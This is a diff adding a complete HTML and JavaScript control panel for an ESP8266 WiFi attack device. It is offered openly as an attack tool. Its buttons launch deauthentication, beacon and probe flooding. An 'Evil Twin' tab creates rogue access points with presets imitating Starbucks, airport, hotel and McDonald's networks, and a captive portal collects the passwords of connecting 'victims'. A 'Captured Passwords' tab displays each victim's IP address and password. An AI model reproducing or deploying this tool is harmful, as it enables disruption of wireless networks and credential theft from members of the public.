@@ -1,0 +1,451 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="pragma" content="no-cache">
+    <meta http-equiv="expires" content="-1">
+    <title>WiFi Control Panel</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            min-height: 100vh;
+            color: #fff;
+        }
+        .header {
+            background: rgba(0,0,0,0.3);
+            padding: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+        }
+        .header h1 { font-size: 24px; color: #00ff88; }
+        .header .status { font-size: 14px; color: #888; }
+        .status-dot {
+            display: inline-block;
+            width: 10px; height: 10px;
+            border-radius: 50%;
+            margin-right: 5px;
+        }
+        .online { background: #00ff88; }
+        .offline { background: #ff4444; }
+        .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
+        
+        .card {
+            background: rgba(255,255,255,0.05);
+            border-radius: 15px;
+            padding: 25px;
+            margin-bottom: 20px;
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+        .card h2 {
+            font-size: 18px;
+            margin-bottom: 15px;
+            color: #00ff88;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; }
+        
+        .attack-buttons { display: flex; flex-wrap: wrap; gap: 10px; }
+        .btn {
+            padding: 15px 25px;
+            border: none;
+            border-radius: 10px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .btn:hover { transform: translateY(-2px); }
+        .btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
+        
+        .btn-deauth { background: linear-gradient(135deg, #ff416c, #ff4b2b); color: white; }
+        .btn-beacon { background: linear-gradient(135deg, #4776e6, #8e54e9); color: white; }
+        .btn-probe { background: linear-gradient(135deg, #f093fb, #f5576c); color: white; }
+        .btn-truedeauth { background: linear-gradient(135deg, #ff0000, #cc0000); color: white; }
+        .btn-eviltwin { background: linear-gradient(135deg, #11998e, #38ef7d); color: white; }
+        .btn-stop { background: linear-gradient(135deg, #434343, #000000); color: white; }
+        .btn-log { background: linear-gradient(135deg, #f7971e, #ffd200); color: #000; }
+        
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 15px;
+            margin-top: 15px;
+        }
+        .stat-box {
+            background: rgba(0,0,0,0.3);
+            padding: 15px;
+            border-radius: 10px;
+            text-align: center;
+        }
+        .stat-value { font-size: 28px; font-weight: bold; color: #00ff88; }
+        .stat-label { font-size: 12px; color: #888; margin-top: 5px; }
+        
+        .log-container {
+            background: #000;
+            border-radius: 10px;
+            padding: 15px;
+            max-height: 400px;
+            overflow-y: auto;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+            line-height: 1.6;
+        }
+        .log-entry { padding: 5px 0; border-bottom: 1px solid #222; }
+        .log-entry .time { color: #888; }
+        .log-entry .ip { color: #00aaff; }
+        .log-entry .pwd { color: #ff4444; font-weight: bold; }
+        .log-empty { color: #666; text-align: center; padding: 20px; }
+        
+        .ssid-input {
+            width: 100%;
+            padding: 12px 15px;
+            background: rgba(0,0,0,0.3);
+            border: 1px solid rgba(255,255,255,0.2);
+            border-radius: 10px;
+            color: white;
+            font-size: 16px;
+            margin-bottom: 15px;
+        }
+        .ssid-input:focus { outline: none; border-color: #00ff88; }
+        
+        .channel-select {
+            padding: 12px 15px;
+            background: rgba(0,0,0,0.3);
+            border: 1px solid rgba(255,255,255,0.2);
+            border-radius: 10px;
+            color: white;
+            font-size: 16px;
+            margin-bottom: 15px;
+        }
+        
+        .attack-status {
+            padding: 15px;
+            background: rgba(0,255,136,0.1);
+            border-radius: 10px;
+            margin-top: 15px;
+            display: none;
+        }
+        .attack-status.active { display: block; }
+        .attack-status.running { border-left: 4px solid #00ff88; }
+        .attack-status.eviltwin { border-left: 4px solid #38ef7d; }
+        
+        .refresh-btn {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            width: 50px; height: 50px;
+            border-radius: 50%;
+            background: #00ff88;
+            border: none;
+            cursor: pointer;
+            font-size: 20px;
+            box-shadow: 0 5px 20px rgba(0,255,136,0.3);
+        }
+        
+        .tab-container { margin-bottom: 20px; }
+        .tab {
+            padding: 12px 25px;
+            background: rgba(255,255,255,0.1);
+            border: none;
+            color: #888;
+            cursor: pointer;
+            border-radius: 10px 10px 0 0;
+            font-size: 14px;
+        }
+        .tab.active { background: rgba(255,255,255,0.15); color: #00ff88; }
+        
+        .tab-content { display: none; }
+        .tab-content.active { display: block; }
+        
+        @media (max-width: 768px) {
+            .stats { grid-template-columns: repeat(2, 1fr); }
+            .attack-buttons { flex-direction: column; }
+            .btn { width: 100%; justify-content: center; }
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div>
+            <h1>ESP8266 Deauther</h1>
+            <div class="status">
+                <span class="status-dot online"></span>
+                <span>ESP Connected</span>
+            </div>
+        </div>
+        <div>
+            <button class="btn btn-stop" onclick="stopAll()">STOP ALL</button>
+        </div>
+    </div>
+    
+    <div class="container">
+        <div class="tab-container">
+            <button class="tab active" onclick="showTab('attack')">Attack</button>
+            <button class="tab" onclick="showTab('eviltwin')">Evil Twin</button>
+            <button class="tab" onclick="showTab('logs')">Captured</button>
+        </div>
+        
+        <!-- ATTACK TAB -->
+        <div id="attack" class="tab-content active">
+            <div class="card">
+                <h2>Attack Control</h2>
+                <div class="attack-buttons">
+                    <button class="btn btn-deauth" onclick="startAttack('deauth')">
+                        Deauth
+                    </button>
+                    <button class="btn btn-beacon" onclick="startAttack('beacon')">
+                        Beacon
+                    </button>
+                    <button class="btn btn-probe" onclick="startAttack('probe')">
+                        Probe
+                    </button>
+                    <button class="btn btn-truedeauth" onclick="startAttack('truedeauth')">
+                        True Deauth
+                    </button>
+                </div>
+                
+                <div id="attackStatus" class="attack-status">
+                    <strong>Attack Running:</strong> <span id="attackType">-</span>
+                    <div class="stats">
+                        <div class="stat-box">
+                            <div class="stat-value" id="pktRate">0</div>
+                            <div class="stat-label">Pkt/s</div>
+                        </div>
+                        <div class="stat-box">
+                            <div class="stat-value" id="deauthPkts">0</div>
+                            <div class="stat-label">Deauths</div>
+                        </div>
+                        <div class="stat-box">
+                            <div class="stat-value" id="beaconPkts">0</div>
+                            <div class="stat-label">Beacons</div>
+                        </div>
+                        <div class="stat-box">
+                            <div class="stat-value" id="probePkts">0</div>
+                            <div class="stat-label">Probes</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- EVIL TWIN TAB -->
+        <div id="eviltwin" class="tab-content">
+            <div class="card">
+                <h2>Evil Twin Attack</h2>
+                <input type="text" class="ssid-input" id="etSSID" placeholder="SSID (default: FreeWiFi)" value="FreeWiFi">
+                <select class="channel-select" id="etChannel">
+                    <option value="1">Channel 1</option>
+                    <option value="2">Channel 2</option>
+                    <option value="3">Channel 3</option>
+                    <option value="4">Channel 4</option>
+                    <option value="5">Channel 5</option>
+                    <option value="6" selected>Channel 6</option>
+                    <option value="7">Channel 7</option>
+                    <option value="8">Channel 8</option>
+                    <option value="9">Channel 9</option>
+                    <option value="10">Channel 10</option>
+                    <option value="11">Channel 11</option>
+                </select>
+                <button class="btn btn-eviltwin" onclick="startEvilTwin()" style="width:100%">
+                    Start Evil Twin
+                </button>
+                
+                <div id="etStatus" class="attack-status eviltwin">
+                    <strong>Evil Twin Active:</strong> <span id="etSSIDDisplay">FreeWiFi</span>
+                    <p style="color:#888;margin-top:10px">
+                        Captive portal akan muncul otomatis ketika korban terhubung
+                    </p>
+                </div>
+            </div>
+            
+            <div class="card">
+                <h2>Quick Presets</h2>
+                <div class="attack-buttons">
+                    <button class="btn btn-eviltwin" onclick="quickET('FreeWiFi')">Free WiFi</button>
+                    <button class="btn btn-eviltwin" onclick="quickET('Starbucks WiFi')">Starbucks</button>
+                    <button class="btn btn-eviltwin" onclick="quickET('Airport_Free')">Airport</button>
+                    <button class="btn btn-eviltwin" onclick="quickET('Hotel_Guest')">Hotel</button>
+                    <button class="btn btn-eviltwin" onclick="quickET('McDonalds Free')">McDonalds</button>
+                </div>
+            </div>
+        </div>
+        
+        <!-- LOGS TAB -->
+        <div id="logs" class="tab-content">
+            <div class="card">
+                <h2>Captured Passwords</h2>
+                <button class="btn btn-log" onclick="refreshLogs()" style="margin-bottom:15px">
+                    Refresh Logs
+                </button>
+                <button class="btn btn-stop" onclick="clearLogs()" style="margin-bottom:15px">
+                    Clear
+                </button>
+                <div class="log-container" id="logContainer">
+                    <div class="log-empty">No passwords captured yet</div>
+                </div>
+            </div>
+            
+            <div class="card">
+                <h2>Statistics</h2>
+                <div class="stats">
+                    <div class="stat-box">
+                        <div class="stat-value" id="totalCaptured">0</div>
+                        <div class="stat-label">Captured</div>
+                    </div>
+                    <div class="stat-box">
+                        <div class="stat-value" id="lastCapture">-</div>
+                        <div class="stat-label">Last Capture</div>
+                    </div>
+                    <div class="stat-box">
+                        <div class="stat-value" id="uptime">-</div>
+                        <div class="stat-label">Uptime</div>
+                    </div>
+                    <div class="stat-box">
+                        <div class="stat-value" id="memFree">-</div>
+                        <div class="stat-label">Free RAM</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <button class="refresh-btn" onclick="refreshStatus()">&#8635;</button>
+    
+    <script>
+        let attackRunning = false;
+        let evilTwinRunning = false;
+        
+        function showTab(tabId) {
+            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+            document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
+            document.querySelector(`[onclick="showTab('${tabId}')"]`).classList.add('active');
+            document.getElementById(tabId).classList.add('active');
+        }
+        
+        function runCmd(cmd) {
+            fetch('/run?cmd=' + encodeURIComponent(cmd))
+                .then(r => r.text())
+                .then(d => console.log('CMD:', cmd, '->', d));
+        }
+        
+        function startAttack(type) {
+            stopAll();
+            setTimeout(() => {
+                runCmd('attack ' + type);
+                attackRunning = true;
+                updateAttackStatus(type, true);
+                setTimeout(refreshStatus, 500);
+            }, 100);
+        }
+        
+        function startEvilTwin() {
+            stopAll();
+            let ssid = document.getElementById('etSSID').value || 'FreeWiFi';
+            let ch = document.getElementById('etChannel').value;
+            runCmd('attack eviltwin ' + ssid);
+            evilTwinRunning = true;
+            document.getElementById('etStatus').classList.add('active');
+            document.getElementById('etSSIDDisplay').textContent = ssid;
+            setTimeout(refreshStatus, 500);
+        }
+        
+        function quickET(ssid) {
+            document.getElementById('etSSID').value = ssid;
+            startEvilTwin();
+        }
+        
+        function stopAll() {
+            runCmd('stop');
+            attackRunning = false;
+            evilTwinRunning = false;
+            updateAttackStatus('', false);
+            document.getElementById('etStatus').classList.remove('active');
+        }
+        
+        function updateAttackStatus(type, running) {
+            let el = document.getElementById('attackStatus');
+            if (running) {
+                el.classList.add('active', 'running');
+                document.getElementById('attackType').textContent = type.toUpperCase();
+            } else {
+                el.classList.remove('active', 'running');
+            }
+        }
+        
+        function refreshStatus() {
+            fetch('/attack.json')
+                .then(r => r.json())
+                .then(data => {
+                    if (data[0][0]) {
+                        attackRunning = true;
+                        updateAttackStatus('DEAUTH', true);
+                    }
+                    document.getElementById('pktRate').textContent = data[3] || 0;
+                    document.getElementById('deauthPkts').textContent = data[0][2] || 0;
+                    document.getElementById('beaconPkts').textContent = data[1][2] || 0;
+                    document.getElementById('probePkts').textContent = data[2][2] || 0;
+                })
+                .catch(e => console.log('Status error:', e));
+        }
+        
+        function refreshLogs() {
+            fetch('/etwin_log.txt')
+                .then(r => r.text())
+                .then(data => {
+                    let container = document.getElementById('logContainer');
+                    if (data.trim() && data !== 'No logs yet') {
+                        let lines = data.trim().split('\n');
+                        document.getElementById('totalCaptured').textContent = lines.length;
+                        let html = '';
+                        lines.forEach(line => {
+                            let parts = line.split('|');
+                            if (parts.length >= 2) {
+                                let time = parts[0].replace('[', '').replace(']', '');
+                                let ip = parts[1].split(':')[1].trim();
+                                let pwd = parts[2] ? parts[2].split(':')[1].trim() : '';
+                                html += `<div class="log-entry">
+                                    <span class="time">[${time}]</span>
+                                    <span class="ip">${ip}</span>
+                                    <span class="pwd">${pwd}</span>
+                                </div>`;
+                            } else {
+                                html += `<div class="log-entry">${line}</div>`;
+                            }
+                        });
+                        container.innerHTML = html;
+                        document.getElementById('lastCapture').textContent = 'Just now';
+                    } else {
+                        container.innerHTML = '<div class="log-empty">No passwords captured yet</div>';
+                    }
+                })
+                .catch(e => {
+                    document.getElementById('logContainer').innerHTML = '<div class="log-empty">Connect to ESP to view logs</div>';
+                });
+        }
+        
+        function clearLogs() {
+            if (confirm('Clear all captured passwords?')) {
+                fetch('/run?cmd=delete /etwin_log.txt')
+                    .then(() => {
+                        refreshLogs();
+                        document.getElementById('totalCaptured').textContent = '0';
+                    });
+            }
+        }
+        
+        setInterval(refreshStatus, 2000);
+        setTimeout(refreshLogs, 1000);
+    </script>
+</body>
+</html>
